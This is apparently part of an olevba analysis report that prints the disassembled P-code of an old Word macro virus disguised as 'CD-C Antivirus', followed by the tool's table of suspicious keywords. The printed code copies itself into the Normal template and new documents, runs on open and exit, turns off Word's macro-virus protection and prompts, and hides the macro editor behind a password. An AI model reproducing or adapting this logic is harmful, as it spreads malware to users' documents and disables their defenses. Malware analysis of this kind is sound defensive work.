' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #181:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #182:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #183:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #184:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #185:
' 	EndSub 
' Line #186:
' Line #187:
' Line #188:
' 	FuncDefn (Sub AutoExec())
' Line #189:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #190:
' 	ArgsCall InitDialog 0x0000 
' Line #191:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld Destroying 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #192:
' 	EndSub 
' Line #193:
' Line #194:
' 	FuncDefn (Sub Destroyer())
' Line #195:
' 	ArgsCall Copy2Normal 0x0000 
' Line #196:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #197:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #198:
' 	ArgsCall Buggy 0x0000 
' Line #199:
' 	ArgsCall CheckNormal 0x0000 
' Line #200:
' 	EndSub 
' Line #201:
' Line #202:
' 	FuncDefn (Sub CheckNormal())
' Line #203:
' 	LineCont 0x0004 07 00 08 00
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Normal 0x0000 
' 	EndIf 
' Line #204:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld Checking 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #205:
' 	EndSub 
' Line #206:
' 	FuncDefn (Sub AutoExit())
' Line #207:
' 	ArgsCall AutoOpen 0x0000 
' Line #208:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #209:
' 	ArgsCall PesanClose 0x0000 
' Line #210:
' 	EndSub 
' Line #211:
' Line #212:
' 	FuncDefn (Sub fileNewDefault())
' Line #213:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #214:
' 	ArgsCall Copy2Document 0x0000 
' Line #215:
' 	EndSub 
' Line #216:
' Line #217:
' 	FuncDefn (Sub FileNew())
' Line #218:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #219:
' 	ArgsCall Copy2Document 0x0000 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	EndSub 
' Line #222:
' Line #223:
' 	FuncDefn (Sub Stealth())
' Line #224:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #225:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #226:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #227:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #228:
' 	EndWith 
' Line #229:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #230:
' Line #231:
' 	EndSub 
' Line #232:
' Line #233:
' 	FuncDefn (Sub NoStealth())
' Line #234:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #235:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #236:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #237:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #238:
' 	EndWith 
' Line #239:
' 	EndSub 
' Line #240:
' Line #241:
' 	FuncDefn (Sub ToolsOptions())
' Line #242:
' 	ArgsCall InitDialog 0x0000 
' Line #243:
' 	ArgsCall NoStealth 0x0000 
' Line #244:
' 	OnError (Resume Next) 
' Line #245:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #246:
' 	ArgsCall Stealth 0x0000 
' Line #247:
' 	EndSub 
' Line #248:
' Line #249:
' 	FuncDefn (Sub NoAccess())
' Line #250:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld msgcap 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #251:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #252:
' 	EndSub 
' Line #253:
' Line #254:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #255:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #256:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #257:
' 	LitStr 0x0005 "CD-C "
' 	Ld EE 
' 	Add 
' 	St cdee 
' Line #258:
' 	Ld xxx 
' 	Ld code 
' 	LitDI2 0x0005 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St sandi 
' Line #259:
' 	Ld pass 
' 	Ld cdee 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld sandi 
' 	Eq 
' 	IfBlock 
' Line #260:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #261:
' 	ElseBlock 
' Line #262:
' 	ArgsCall NoAccess 0x0000 
' Line #263:
' 	EndIfBlock 
' Line #264:
' 	EndFunc 
' Line #265:
' Line #266:
' Line #267:
' 	FuncDefn (Sub ToolsMacro())
' Line #268:
' 	QuoteRem 0x0004 0x000A "InitDialog"
' Line #269:
' 	QuoteRem 0x0004 0x0016 "ToolsMacrosDlg.Display"
' Line #270:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #271:
' 	EndSub 
' Line #272:
' Line #273:
' Line #274:
' 	FuncDefn (Sub FileTemplates())
' Line #275:
' 	ArgsCall InitDialog 0x0000 
' Line #276:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #277:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #278:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #279:
' 	EndSub 
' Line #280:
' Line #281:
' 	FuncDefn (Sub ViewVbCode())
' Line #282:
' 	QuoteRem 0x0004 0x002E "Application.ShowVisualBasicEditor = passDialog"
' Line #283:
' 	EndSub 
' Line #284:
' Line #285:
' 	FuncDefn (Sub viewcode())
' Line #286:
' 	QuoteRem 0x0004 0x000A "viewvbcode"
' Line #287:
' 	EndSub 
' Line #288:
' Line #289:
' 	FuncDefn (Sub Organizer())
' Line #290:
' 	ArgsCall InitDialog 0x0000 
' Line #291:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #292:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #293:
' 	EndSub 
' Line #294:
' Line #295:
' 	FuncDefn (Sub FormatStyle())
' Line #296:
' 	ArgsCall InitDialog 0x0000 
' Line #297:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #298:
' 	ArgsMemCallWith Display 0x0000 
' Line #299:
' 	ArgsMemCallWith Execute 0x0000 
' Line #300:
' 	EndWith 
' Line #301:
' 	EndSub 
' Line #302:
' Line #303:
' Line #304:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #305:
' 	OnError (Resume Next) 
' Line #306:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #307:
' 	EndSub 
' Line #308:
' Line #309:
' Line #310:
' 	FuncDefn (Sub Ngeceng())
' Line #311:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0064 
' 	For 
' Line #312:
' 	ArgsCall Beep 0x0000 
' Line #313:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #314:
' 	StartWithExpr 
' 	Ld CDC_Form 
' 	With 
' Line #315:
' 	LitDI2 0x00DC 
' 	MemStWith With 
' Line #316:
' 	LitDI2 0x00AA 
' 	MemStWith Height 
' Line #317:
' 	StartWithExpr 
' 	MemLdWith Judul 
' 	With 
' Line #318:
' 	LitDI2 0x000F 
' 	MemStWith LBound 
' Line #319:
' 	LitDI2 0x0005 
' 	MemStWith Top 
' Line #320:
' 	LitDI2 0x00B4 
' 	MemStWith With 
' Line #321:
' 	LitDI2 0x0014 
' 	MemStWith Height 
' Line #322:
' 	Ld CDE 
' 	MemStWith Caption 
' Line #323:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #324:
' 	EndWith 
' Line #325:
' 	StartWithExpr 
' 	MemLdWith OKButton 
' 	With 
' Line #326:
' 	LitDI2 0x0032 
' 	MemStWith With 
' Line #327:
' 	LitDI2 0x0019 
' 	MemStWith Height 
' Line #328:
' 	LitDI2 0x0055 
' 	MemStWith LBound 
' Line #329:
' 	LitDI2 0x0078 
' 	MemStWith Top 
' Line #330:
' 	EndWith 
' Line #331:
' 	StartWithExpr 
' 	MemLdWith Komentar 
' 	With 
' Line #332:
' 	LitDI2 0x00C8 
' 	MemStWith With 
' Line #333:
' 	LitDI2 0x005A 
' 	MemStWith Height 
' Line #334:
' 	LitDI2 0x001E 
' 	MemStWith Top 
' Line #335:
' 	LitDI2 0x0005 
' 	MemStWith LBound 
' Line #336:
' 	EndWith 
' Line #337:
' 	ArgsMemCallWith Show 0x0000 
' Line #338:
' 	EndWith 
' Line #339:
' Line #340:
' 	EndSub 
' Line #341:
' Line #342:
' 	FuncDefn (Sub HelpAbout())
' Line #343:
' 	StartWithExpr 
' 	Ld CDC_Form 
' 	With 
' Line #344:
' 	LitStr 0x000A "About CD-C"
' 	MemStWith Caption 
' Line #345:
' 	LineCont 0x0008 11 00 10 00 1F 00 10 00
' 	Ld HAText1 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld cipta 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld ttgl 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld mail 
' 	Concat 
' 	MemLdWith Komentar 
' 	MemSt Then 
' Line #346:
' 	EndWith 
' Line #347:
' 	ArgsCall Ngeceng 0x0000 
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' Line #351:
' 	FuncDefn (Sub PesanClose())
' Line #352:
' 	Ld Time 
' 	St H 
' Line #353:
' 	LineCont 0x0008 11 00 08 00 15 00 08 00
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSaturday 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	LitDate 0x0000 0x0000 0x0160 0x40E2 
' 	Gt 
' 	And 
' 	Ld Time 
' 	LitDate 0xAAAB 0xAAAA 0xAAAA 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x0000 0x0000 0x0000 0x3FEC 
' 	Lt 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #354:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #355:
' 	ArgsCall Beep 0x0000 
' Line #356:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #357:
' 	LitStr 0x000F "Selamat Tinggal"
' 	Ld CDC_Form 
' 	MemSt Caption 
' Line #358:
' 	StartWithExpr 
' 	Ld CDC_Form 
' 	MemLd Komentar 
' 	With 
' Line #359:
' 	LineCont 0x0014 0A 00 10 00 11 00 10 00 18 00 10 00 1F 00 10 00 2D 00 10 00
' 	LitStr 0x0013 "CD-C Antivirus v.10"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0028 "Terimakasih atas pengguanan software ini"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0027 "dan semoga komputer anda terhindar dari"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 "virus komputer yang merusak. Amiin."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld cipta 
' 	Concat 
' 	LitStr 0x000A ", Nov 2000"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld mail 
' 	Concat 
' 	MemStWith Then 
' Line #360:
' 	EndWith 
' Line #361:
' 	ArgsCall Ngeceng 0x0000 
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

